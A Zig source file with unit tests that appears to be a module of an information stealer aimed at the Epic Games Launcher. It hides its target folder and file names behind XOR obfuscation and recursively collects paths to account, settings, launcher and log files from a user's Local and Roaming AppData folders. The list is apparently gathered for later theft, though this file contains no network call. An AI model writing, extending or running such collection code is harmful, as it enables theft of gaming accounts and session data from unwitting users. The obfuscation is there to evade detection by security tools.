const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    pub const epic_launcher_path = hash.xorEncrypt("EpicGamesLauncher");
    pub const saved = hash.xorEncrypt("Saved");
    pub const config = hash.xorEncrypt("Config");
    pub const windows = hash.xorEncrypt("Windows");
    pub const game_user_settings = hash.xorEncrypt("GameUserSettings.ini");
    pub const engine_ini = hash.xorEncrypt("Engine.ini");
    pub const game_ini = hash.xorEncrypt("Game.ini");
    pub const input_ini = hash.xorEncrypt("Input.ini");
    pub const data = hash.xorEncrypt("Data");
    pub const logs = hash.xorEncrypt("Logs");
    pub const unreal_engine = hash.xorEncrypt("UnrealEngineLauncher");
};

pub const EpicResult = struct {
    found: bool,
    files: [][]const u8,
};

fn isImportantFile(name: []const u8) bool {
    const ext = std.fs.path.extension(name);
    const important_exts = [_][]const u8{ ".ini", ".json", ".cfg", ".dat", ".log", ".txt" };
    const important_keywords = [_][]const u8{ "config", "setting", "user", "account", "launcher", "game" };

    var has_ext = false;
    for (important_exts) |e| {
        if (std.mem.eql(u8, ext, e)) {
            has_ext = true;
            break;
        }
    }
    if (!has_ext) return false;

    const lower = std.ascii.lowerString(std.heap.page_allocator, name) catch return false;
    defer std.heap.page_allocator.free(lower);

    for (important_keywords) |kw| {
        if (std.mem.indexOf(u8, lower, kw) != null) return true;
    }
    return false;
}

fn collectDirFiles(allocator: std.mem.Allocator, dir_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);

    var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch return files.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind == .file) {
            if (isImportantFile(entry.name)) {
                const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
                try files.append(full);
            }
        } else if (entry.kind == .directory) {
            const sub = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
            defer allocator.free(sub);

            const sub_files = try collectDirFiles(allocator, sub);
            try files.appendSlice(sub_files);
            allocator.free(sub_files);
        }
    }
    return files.toOwnedSlice();
}

fn scanConfigFiles(allocator: std.mem.Allocator, base: []const u8, config_names: []const []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);

    var dir = std.fs.openDirAbsolute(base, .{ .iterate = true }) catch return files.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind != .file) continue;
        for (config_names) |cfg| {
            if (std.mem.indexOf(u8, entry.name, cfg) != null) {
                const full = try std.fs.path.join(allocator, &[_][]const u8{ base, entry.name });
                try files.append(full);
                break;
            }
        }
    }
    return files.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const u8) !EpicResult {
    var all_files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (all_files.items) |f| allocator.free(f);
        all_files.deinit();
    }

    var epic_launcher_decrypted: [E.epic_launcher_path.len]u8 = undefined;
    hash.xorDecrypt(&E.epic_launcher_path, &epic_launcher_decrypted);

    const local_epic = try std.fs.path.join(allocator, &[_][]const u8{ local, &epic_launcher_decrypted });
    defer allocator.free(local_epic);
    const roaming_epic = try std.fs.path.join(allocator, &[_][]const u8{ roaming, &epic_launcher_decrypted });
    defer allocator.free(roaming_epic);

    var saved_decrypted: [E.saved.len]u8 = undefined;
    var config_decrypted: [E.config.len]u8 = undefined;
    var windows_decrypted: [E.windows.len]u8 = undefined;
    var game_user_settings_decrypted: [E.game_user_settings.len]u8 = undefined;
    var engine_ini_decrypted: [E.engine_ini.len]u8 = undefined;
    var game_ini_decrypted: [E.game_ini.len]u8 = undefined;
    var input_ini_decrypted: [E.input_ini.len]u8 = undefined;

    hash.xorDecrypt(&E.saved, &saved_decrypted);
    hash.xorDecrypt(&E.config, &config_decrypted);
    hash.xorDecrypt(&E.windows, &windows_decrypted);
    hash.xorDecrypt(&E.game_user_settings, &game_user_settings_decrypted);
    hash.xorDecrypt(&E.engine_ini, &engine_ini_decrypted);
    hash.xorDecrypt(&E.game_ini, &game_ini_decrypted);
    hash.xorDecrypt(&E.input_ini, &input_ini_decrypted);

    const config_names = [_][]const u8{
        &game_user_settings_decrypted,
        &engine_ini_decrypted,
        &game_ini_decrypted,
        &input_ini_decrypted,
    };

    if (std.fs.openDirAbsolute(local_epic, .{}) catch null) |*dir| {
        defer dir.close();

        const saved_config_path = try std.fs.path.join(allocator, &[_][]const u8{ local_epic, &saved_decrypted, &config_decrypted, &windows_decrypted });
        defer allocator.free(saved_config_path);

        if (scanConfigFiles(allocator, saved_config_path, &config_names)) |saved_config| {
            try all_files.appendSlice(saved_config);
            allocator.free(saved_config);
        }

        var sub_iter = dir.iterate();
        while (sub_iter.next() catch null) |entry| {
            if (entry.kind != .directory) continue;
            const full = try std.fs.path.join(allocator, &[_][]const u8{ local_epic, entry.name });
            defer allocator.free(full);

            const sub_files = collectDirFiles(allocator, full) catch continue;
            try all_files.appendSlice(sub_files);
            allocator.free(sub_files);
        }
    }

    if (std.fs.openDirAbsolute(roaming_epic, .{}) catch null) |*dir| {
        defer dir.close();

        var sub_iter = dir.iterate();
        while (sub_iter.next() catch null) |entry| {
            if (entry.kind != .directory) continue;
            const full = try std.fs.path.join(allocator, &[_][]const u8{ roaming_epic, entry.name });
            defer allocator.free(full);

            const sub_files = collectDirFiles(allocator, full) catch continue;
            try all_files.appendSlice(sub_files);
            allocator.free(sub_files);
        }
    }

    return EpicResult{
        .found = all_files.items.len > 0,
        .files = try all_files.toOwnedSlice(),
    };
}

fn freeEpicResult(result: EpicResult, allocator: std.mem.Allocator) void {
    for (result.files) |f| allocator.free(f);
    allocator.free(result.files);
}

const testing = std.testing;

test "collect returns empty for nonexistent epic" {
    const result = try collect(testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer freeEpicResult(result, testing.allocator);
    try testing.expect(!result.found);
    try testing.expectEqual(@as(usize, 0), result.files.len);
}

test "isImportantFile rejects empty" {
    try testing.expect(!isImportantFile(""));
    try testing.expect(!isImportantFile("file.txt"));
}

test "epic not found" {
    const result = try collect(testing.allocator, "C:\\__missing__", "C:\\__missing__");
    defer freeEpicResult(result, testing.allocator);
    try testing.expect(!result.found);
}

test "EpicResult default" {
    const er = EpicResult{
        .found = false,
        .files = &[_][]const u8{},
    };
    try testing.expect(!er.found);
    try testing.expectEqual(@as(usize, 0), er.files.len);
}
